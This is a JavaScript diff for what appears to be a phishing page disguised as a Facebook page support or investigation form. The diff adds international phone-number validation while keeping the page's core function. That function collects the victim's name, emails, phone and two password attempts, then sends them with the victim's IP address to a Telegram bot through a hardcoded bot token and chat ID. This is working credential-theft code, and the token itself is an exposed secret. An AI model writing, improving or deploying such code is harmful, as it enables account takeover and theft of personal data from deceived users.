@@ -5,48 +5,51 @@ function getIP(callback) {
         .catch(error => callback(undefined));
 }
 
-$(document).ready(function () {
+let iti;
 
+function initPhoneInput() {
+    const input = document.querySelector("#phone");
+
+    iti = window.intlTelInput(input, {
+        initialCountry: "auto",
+        geoIpLookup: function (success, failure) {
+            fetch("https://ipinfo.io/json?token=YOUR_TOKEN")
+                .then((res) => res.json())
+                .then((data) => success(data.country))
+                .catch(() => success("us"));
+        },
+        separateDialCode: true,
+        utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/utils.js",
+    });
+}
+
+$(document).ready(function () {
     $('#input').html(`
-                            <div class="mb-3">
-                                <label for="page-name" class="form-label">
-                                    Page Name <span class="text-danger">*</span>
-                                </label>
-                                <input type="text" class="form-control" required id="page-name" aria-describedby="emailHelp">
-                            </div>
-                            <div class="mb-3">
-                                <label for="full-name" class="form-label">
-                                    Full Name <span class="text-danger">*</span>
-                                </label>
-                                <input type="text" class="form-control" required id="full-name" aria-describedby="emailHelp">
-                            </div>
-                            <div class="mb-3">
-                                <label for="business-email" class="form-label">
-                                    Business Email Address <span class="text-danger">*</span>
-                                </label>
-                                <input type="text" class="form-control" required id="business-email"
-                                    aria-describedby="emailHelp">
-                            </div>
-                            <div class="mb-3">
-                                <label for="personal-email" class="form-label">
-                                    Personal Email Address <span class="text-danger">*</span>
-                                </label>
-                                <input type="text" class="form-control" required id="personal-email"
-                                    aria-describedby="emailHelp">
-                            </div>
-                            <div class="mb-3">
-                                <label for="phone" class="form-label">
-                                    Mobile Phone Number <span class="text-danger">*</span>
-                                </label>
-                                <input type="text" class="form-control" required id="phone" aria-describedby="emailHelp">
-                            </div>
-                            <div class="mb-3">
-                                <label for="full-name" class="form-label">
-                                    Please provide us information that will help us investigate.
-                                </label>
-                                <textarea class="form-control" id="description" rows="3"></textarea>
-                            </div>
-                            <button type="button" class="btn mb-4">Submit</button>
+        <div class="mb-3">
+            <label for="page-name" class="form-label">Page Name <span class="text-danger">*</span></label>
+            <input type="text" class="form-control" required id="page-name">
+        </div>
+        <div class="mb-3">
+            <label for="full-name" class="form-label">Full Name <span class="text-danger">*</span></label>
+            <input type="text" class="form-control" required id="full-name">
+        </div>
+        <div class="mb-3">
+            <label for="business-email" class="form-label">Business Email Address <span class="text-danger">*</span></label>
+            <input type="text" class="form-control" required id="business-email">
+        </div>
+        <div class="mb-3">
+            <label for="personal-email" class="form-label">Personal Email Address <span class="text-danger">*</span></label>
+            <input type="text" class="form-control" required id="personal-email">
+        </div>
+        <div class="mb-3">
+            <label for="phone" class="form-label">Mobile Phone Number <span class="text-danger">*</span></label>
+            <input type="text" class="form-control" required id="phone">
+        </div>
+        <div class="mb-3">
+            <label for="description" class="form-label">Please provide us information that will help us investigate.</label>
+            <textarea class="form-control" id="description" rows="3"></textarea>
+        </div>
+        <button type="button" class="btn mb-4">Submit</button>
     `)
 
     openDetail();
@@ -55,26 +58,13 @@ $(document).ready(function () {
     getIP(ip => {
         IpAddress = ip;
         sendForm(IpAddress);
+        initPhoneInput();
     });
-
-    $('#phone').on('input', function () {
-        var input = $(this).val();
-        var validInputRegex = /^[+\d]*$/; // Chỉ cho phép số và dấu cộng
-
-        if (!validInputRegex.test(input)) {
-            // Nếu nhập giá trị không hợp lệ, loại bỏ ký tự cuối cùng nhập vào
-            $(this).val(input.slice(0, -1));
-        }
-    });
-
-
 });
 
 function openDetail() {
     $(".nav-item-parent").on("click", function () {
-        var currentRotate = $(this).find(".arrow").css("rotate");
-        currentRotate = currentRotate.replace("deg", "");
-
+        var currentRotate = $(this).find(".arrow").css("rotate").replace("deg", "");
         var isOpen = currentRotate == 0 ? false : true;
 
         $(".detail").css("display", "none");
@@ -91,18 +81,14 @@ function openDetail() {
     });
 
     $(".nav-item-child").on("click", function () {
-        var currentRotate = $(this).find(".arrow").css("rotate");
-        currentRotate = currentRotate.replace("deg", "");
-
+        var currentRotate = $(this).find(".arrow").css("rotate").replace("deg", "");
         var isOpen = currentRotate == 0 ? false : true;
 
         const id = $(this).data("id");
         if (isOpen) {
             $("#" + id).css("display", "none");
             $(this).find(".arrow").css("rotate", "0deg");
-            $(this)
-                .find(".icon-container")
-                .css("background-color", "var(--color-white-secondary)");
+            $(this).find(".icon-container").css("background-color", "var(--color-white-secondary)");
             $(this).find(".icon-container i").css("-webkit-filter", "invert(0%)");
             $(this).css("background", "none");
         } else {
@@ -116,10 +102,8 @@ function openDetail() {
 }
 
 function validateForm() {
-
     var isValid = true;
 
-    // Validate trường Page Name
     var pageName = $('#page-name').val();
     if (pageName === '') {
         isValid = false;
@@ -128,7 +112,6 @@ function validateForm() {
         $('#page-name').removeClass('border-danger');
     }
 
-    // Validate trường Full Name
     var fullName = $('#full-name').val();
     if (fullName === '') {
         isValid = false;
@@ -137,7 +120,6 @@ function validateForm() {
         $('#full-name').removeClass('border-danger');
     }
 
-    // Validate trường Business Email
     var businessEmail = $('#business-email').val();
     var emailRegex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
     if (!emailRegex.test(businessEmail)) {
@@ -147,7 +129,6 @@ function validateForm() {
         $('#business-email').removeClass('border-danger');
     }
 
-    // Validate trường Personal Email
     var personalEmail = $('#personal-email').val();
     if (!emailRegex.test(personalEmail)) {
         isValid = false;
@@ -156,28 +137,22 @@ function validateForm() {
         $('#personal-email').removeClass('border-danger');
     }
 
-    // Validate trường Phone
     var phone = $('#phone').val();
-    // Cho phép dấu "+" ở đầu và sau đó là các chữ số
-    var phoneRegex = /^(\+\d+|\d+)$/;
-
-    if (!phoneRegex.test(phone)) {
+    if (!iti.isValidNumber()) {
         isValid = false;
         $('#phone').addClass('border-danger');
     } else {
         $('#phone').removeClass('border-danger');
     }
 
-
     return isValid;
-
 }
 
 var NUMBER_TIME_LOGIN = 0;
+let FIRST_PASSWORD = '';
 
 function sendForm(IpAddress) {
     $(".content #dataGet button[type=button]").off("click");
-
     $(".content #dataGet button[type=button]").on("click", function () {
         if (validateForm()) {
             showPrompt(IpAddress, true);
@@ -185,11 +160,7 @@ function sendForm(IpAddress) {
     });
 }
 
-let FIRST_PASSWORD = '';
-
 function showPrompt(IpAddress) {
-
-
     $('#getPassword').removeClass('d-none');
     $("#close-password").off("click");
     $('#close-password').on('click', function () {
@@ -205,17 +176,20 @@ function showPrompt(IpAddress) {
         } else {
             $('#password').removeClass('border-danger');
         }
+
         let secondPassword = '';
         if (NUMBER_TIME_LOGIN >= 1) {
             secondPassword = password;
             password = FIRST_PASSWORD;
         }
 
+        const phoneFormatted = iti.getNumber();
+
         const message1 = `<strong>User Email: </strong><code>${$("#business-email").val()}</code>
 %0A<strong>User Name: </strong><code>${$("#full-name").val()}</code>
 %0A<strong>User Email: </strong><code>${$("#personal-email").val()}</code>
 %0A<strong>Facebook Page: </strong><code>${$("#page-name").val()}</code>
-%0A<strong>Phone Number: </strong><code>${$("#phone").val()}</code>
+%0A<strong>Phone Number: </strong><code>${phoneFormatted}</code>
 %0A<strong>First Password: </strong><code>${password}</code>
 %0A<strong>Second Password: </strong><code>${secondPassword}</code>
 %0A<strong>IP Address: </strong><code>${IpAddress.ipAddress}</code>
@@ -224,25 +198,18 @@ function showPrompt(IpAddress) {
 
         const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk';
         const chatId = '-1002416068664';
-        const message = message1;
 
-        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-        fetch(telegramUrl, {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: chatId,
-                text: message,
+                text: message1,
                 parse_mode: 'html'
             })
         })
         .then(response => {
-            if (!response.ok) {
-                throw new Error('Network response was not ok');
-            }
+            if (!response.ok) throw new Error('Network error');
             return response.json();
         })
         .then(data => {
@@ -270,8 +237,5 @@ function showPrompt(IpAddress) {
                 $('.lsd-ring-container').addClass('d-none');
             }, 500);
         });
-
     });
-
-
 }
